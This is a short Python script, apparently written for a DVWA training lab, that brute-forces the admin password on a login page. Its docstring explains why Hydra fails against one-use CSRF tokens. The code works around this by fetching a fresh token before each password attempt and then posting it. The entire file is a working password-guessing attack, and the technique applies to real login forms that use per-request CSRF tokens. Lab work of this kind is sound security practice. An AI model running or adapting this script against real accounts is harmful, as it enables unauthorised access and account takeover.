#!/usr/bin/env python3
"""Brute-force the hidden DVWA login at http://<target>/legacy/login.php.

Hydra's http-post-form module can't be used as-is here: DVWA issues a
fresh CSRF token on every GET and invalidates it after one POST, so a
tool that reuses one fixed token for many attempts can't tell a wrong
password apart from a stale token - every attempt looks like a "success".
This script does a GET, extract-token, POST cycle for every single
password tried, the way a real attacker's custom script would.

Usage: dvwa-bruteforce.py [wordlist] [target-ip]
"""
import re
import sys
import requests

USERNAME = "admin"

def try_password(session, url, password):
    r = session.get(url)
    token = re.search(r"user_token' value='([^']+)'", r.text).group(1)
    r = session.post(url, data={
        "username": USERNAME, "password": password,
        "Login": "Login", "user_token": token,
    })
    return "Login failed" not in r.text

def main():
    wordlist = sys.argv[1] if len(sys.argv) > 1 else "/home/vagrant/passwords.txt"
    target_ip = sys.argv[2] if len(sys.argv) > 2 else "10.10.20.10"
    url = f"http://{target_ip}/legacy/login.php"

    with open(wordlist) as f:
        passwords = [line.strip() for line in f if line.strip()]

    session = requests.Session()
    for pw in passwords:
        ok = try_password(session, url, pw)
        print(f"  {USERNAME}:{pw} -> {'SUCCESS' if ok else 'fail'}")
        if ok:
            print(f"\nFound it: {USERNAME}:{pw}")
            return 0
    print("\nNo password in the list worked.")
    return 1

if __name__ == "__main__":
    sys.exit(main())
